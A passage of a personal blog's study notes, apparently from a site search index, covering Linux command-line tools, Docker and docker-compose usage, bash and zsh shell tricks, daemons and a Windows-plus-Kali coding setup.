href="https://www.cnblogs.com/wxywxy/p/7756596.html">用法</a>, 主要是传递最后执行的命令的参数，以方便的运行新命令(非常实用)</li><li><a href="http://c.biancheng.net/linux/ln.html">ln命令|symbolic_link</a> </li><li>scp &amp; mkdir &amp; mv(linux中重命名的唯一方法)</li><li><em><strong>screen</strong></em>: window manager, 好多快捷键, 复制了一份<a href="https://gist.github.com/joaopizani/2718397">.screenrc</a>, 还挺有趣的.<ul><li>screen这玩意儿也太强了.<code>Ctrl + A + [</code>进入copy模式才能使用滚轮或者Ctrl+F/B等等来翻页(已经改成&lt;C-/&gt;)</li></ul></li><li><del>看到一个cscope包可以用来解析C/C++项目, 有空再研究怎么玩</del>(谁玩啊2</li><li>vim-gtk是vim的一个GUI版本, 装了之后才能vim -g</li><li>新命令: <code>tput</code>好像是用一个通用命令做参数,  然后在当前终端的数据库中找到正确的命令并发送</li><li><strong>ipython: System shell with !</strong> interactive Python也挺神奇的, 具体见pwn-modules里的帮助.<ul><li><a href="https://blog.51cto.com/essun/1712322">ipython用法</a> </li></ul></li><li>发现grep有拓展正则和普通正则的区别, 又是一大堆东西, 有缘再看吧.</li><li>新东西: <strong>sed</strong>, stream editor.  还有一个ed, 根本不知道怎么用. <del>这东西这两天把菜鸟教程上所有的命令全看一边就行了</del> 上面没有.<br><em><strong>rev nl</strong></em>  perror<ul><li>真不错, 用了sed来改c.c中的题目标号, 再方便一点.</li></ul></li><li><code>find</code>的功能真的很多, 又是一个相当强大的工具. e.g. <code>find . -name Makefile</code> </li><li><code>wc</code> 命令, 计数文件字节数 行数等等.</li><li><code>uniq</code> report repeated lines.</li><li><code>ls -ARl *</code> 递归展示文件并且不显示.和.. 还能显示符号链接 以及<code>tree</code>命令</li><li><code>shuf</code> generate random permutation.</li><li><code>sleep infinity</code> 手册里完全没看见这个infinity, 不过作用也显而易见了.</li><li><code>xargs</code> build and exec commands from standard input.</li><li><code>bat</code> cat(1) clone with syntax highlighting and git integration.</li><li><code>awk</code> <a href="https://www.ibm.com/docs/zh/aix/7.2?topic=awk-command">IBM doc</a> </li><li><code>sort</code> : -k 可以指定跳过前面几个字符. <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">KEYDEF is F[.C][OPTS][,F[.C][OPTS]] <span class="hljs-keyword">for</span> start and stop position, <span class="hljs-built_in">where</span> F is a field number and C<br>       a character position <span class="hljs-keyword">in</span> the field; both are origin 1, and the stop position defaults to the<br>       line<span class="hljs-string">&#x27;s end.</span><br></code></pre></div></td></tr></table></figure></li><li><code>du -sh</code> show directory contents size.</li><li><code>cut</code> : <code>cut -d&#39; &#39; -f1 /proc/uptime</code> 等同于 <code>awk &#39;&#123;print $1;&#125;&#39; /proc/uptime</code> </li><li><code>xz + tar</code> <ul><li>compress:<code>tar -cf - SalesData | xz -9ze -T0 &gt;SalesData.tar.xz</code><br>or cheaper: <code>tar cfJ output.tar.xz inputfiles</code> </li><li>decompress:<code>tar xf archive.tar.xz</code> </li></ul></li><li></li></ul><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><ul><li>How to exit the running container? <a href="https://linuxhandbook.com/exit-docker-container/">here</a> : that is pressing <code>ctrl+p &amp;&amp; ctrl+q</code>.</li><li><code>sudo docker exec -it CONTAINER_ID sh</code>  exec: run command in a running container.</li><li><code>docker rm/rmi</code> <code>docker ps -all</code> <code>docker images</code> </li><li>docker <strong>file</strong> <a href="https://docs.docker.com/engine/reference/builder/">reference</a> | docker <strong>compose</strong> <a href="https://docs.docker.com/compose/compose-file/">reference</a> </li><li><code>netstat -antu</code> to check whether some container is using ports or not.</li><li>remove used data: <a href="https://stackoverflow.com/questions/32723111/how-to-remove-old-and-unused-docker-images/32723127#32723127">prune</a> </li><li><a href="https://docs.docker.com/engine/reference/commandline/run/"><code>docker run</code></a> </li><li><code>service docker restart</code> </li><li>docker-compose<ul><li>up = start container, down = remove container</li><li>only after removing container can it rm image. maybe <code>dc container prune</code> </li><li><code>dcc up -d</code> + <code>dcc exec [service name] bash</code>: setup a interactive shell</li></ul></li></ul><ul><li><strong>docker desktop</strong>: BIG FAILURE, gnome desktop environment | KVM in kali is not supported | ubuntu 22.04 wired problem | kali root account cant open docker desktop | kali normal account cant open settings. there are so many problems.</li><li><strong>docker engine</strong>: building and containerizing your application</li><li><strong>docker compose</strong>: defining and running multi-container Docker applications.<ul><li>in one container’s circumstance, the same as docker engine.</li><li>compose file’s <a href="https://docs.docker.com/compose/compose-file/">format</a> </li></ul></li><li>expose or publish<ul><li><code>EXPOSE</code> is a way of <strong>documenting</strong></li><li><code>--publish</code> (or <code>-p</code>) is a way of <strong>mapping</strong> a <em>host port</em> to a running <em>container port</em></li></ul></li></ul><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h3 id="Shell-programming"><a href="#Shell-programming" class="headerlink" title="Shell programming"></a>Shell programming</h3><p>好多东西, 看了下感觉更会用shell了.</p><ul><li>printf使用示例: <ul><li><code>printf &#39;%d %d %d %d&#39; \&#39;a 3 4 \&#39;a</code> <code>printf &quot;\\$(printf %o 74)&quot;</code> <code>printf &quot;\\x$(printf %x 65)&quot;</code> </li></ul></li><li><a href="https://stackoverflow.com/questions/31255699">double-parenthesis</a> | <a href="https://stackoverflow.com/questions/890262#answer-8339221">&#39;$1 : leading-quote</a> | <strong>condition expr</strong>(bash doc P98) | </li><li>Shell Parameter Expansion有字符串下标索引.</li><li><code>seq</code> 生成序列.</li><li>dup2可用来实现shell的redirection. 还可以指定fd. 好像之前的一题又有新的解决方法了, 不过得用c来写.</li><li>开启了extglob(zsh) | extglob(bash)之后, 可以使用<code>?*+@!(pattern-list)</code>这五种.<br>zsh还可以用<code>^</code>等等, <a href="http://zsh.sourceforge.net/Doc/Release/Expansion.html#Glob-Operators">文档在这儿</a>.<br>知道这些之后就可以更好的filter file了<ul><li><code>rm -r ^(sh|1_sh)</code> </li><li><code>ll ^(|*sh)</code> 两个都加只能这样.</li></ul></li><li><code>cp --preserve=links</code> 或者 <code>cp -av</code>就可以复制symlink了.<br><code>v</code>只是verbose的意思, <code>a</code>覆盖了一些选项, 用于完整的复制文件本身. </li><li><code>while [ 1 ]</code>add spaces between <code>1</code>.</li><li>判断子串: <ul><li><code>$&#123;string##*cd*&#125;</code> 这个##会从string删除匹配字符串就挺神奇的. 得用<code>[ -z ... ]</code>来判断成功.</li></ul></li><li>backtick在命令中相当于<code>$()</code>的作用.</li><li></li></ul><h3 id="Shell-tips"><a href="#Shell-tips" class="headerlink" title="Shell tips"></a>Shell tips</h3><ul><li>cd’s special function in <mark>zsh</mark>: </li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">cd [ -qsLP ] [ arg ]<br>cd [ -qsLP ] old new   #替换path中的字符串<br>cd [ -qsLP ] &#123;+|-&#125;n    #打开dirs输出的entry, +-表示顺序<br></code></pre></div></td></tr></table></figure><ul><li>print:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">print [ -abcDilmnNoOpPrsSz ] [ -u n ] [ -f format ] [ -C cols ]<br>[ -v name ] [ -xX tabstop ] [ -R [ -en ]] [ arg ... ]<br></code></pre></div></td></tr></table></figure><ul><li><code>where</code> and <code>which</code> is the variants of <code>whence</code> </li><li>automatically ls after cd: <code>chpwd() ls</code> – define a function in zsh which chpwd() is always called when there is pwd change. </li><li>Patterns used for filename generation may <strong>end in a list of qualifiers enclosed in parentheses</strong> in zsh. </li></ul><h2 id="Deamon"><a href="#Deamon" class="headerlink" title="Deamon"></a>Deamon</h2><ul><li>pronounciation: /ˈdiːmən/</li><li>the parent process is often, but not always, the <em>init</em>  process. often ends with <strong>d</strong> letter.</li><li>deamon exp.: cron | xinetd | </li></ul><h2 id="Coding-in-windows"><a href="#Coding-in-windows" class="headerlink" title="Coding in windows"></a>Coding in windows</h2><h3 id="mount-pwntools"><a href="#mount-pwntools" class="headerlink" title="mount+pwntools"></a>mount+pwntools</h3><p>在windows下使用共享文件夹+装上pwntools+ssh连接kali = 主机写代码, 带有补全高亮, ssh输入命令. </p><h3 id="Vscode-ssh"><a href="#Vscode-ssh" class="headerlink" title="Vscode ssh"></a>Vscode ssh</h3><p>暂时还是不用了, 这个和虚拟机里的vscode插件并不一样. 装两次属实没必要. code server已经装上了, 也不知道哪里卸载.</p><p>已真香. </p><img src="../../image/linux的使用/architecture.png" alt="Architecture diagram" style="zoom:80%;" />]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
